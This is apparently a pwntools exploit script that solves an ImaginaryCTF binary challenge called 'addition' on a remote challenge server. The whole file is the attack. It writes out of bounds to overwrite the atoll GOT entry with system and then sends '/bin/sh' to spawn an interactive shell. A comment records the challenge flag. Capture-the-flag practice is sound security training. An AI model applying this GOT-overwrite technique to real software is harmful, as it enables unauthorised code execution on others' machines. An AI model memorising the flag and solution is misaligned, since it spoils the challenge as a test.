#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
# first fgets
brva 0x1299
'''

p = remote("addition.chal.imaginaryctf.org", 1337)
#p = process('./vuln_patched')
#p = gdb.debug('./vuln_patched', gdbscript = script)

sla(b"where? ", f"-{0x49}".encode()) # aim for atoll got
sla(b"what? ", f"{0xd6f0}".encode()) # offset &system - &atoll
sla(b"where? ", b"/bin/sh\x00")

p.interactive()
#ictf{i_love_finding_offsets_4fd29170cb90}
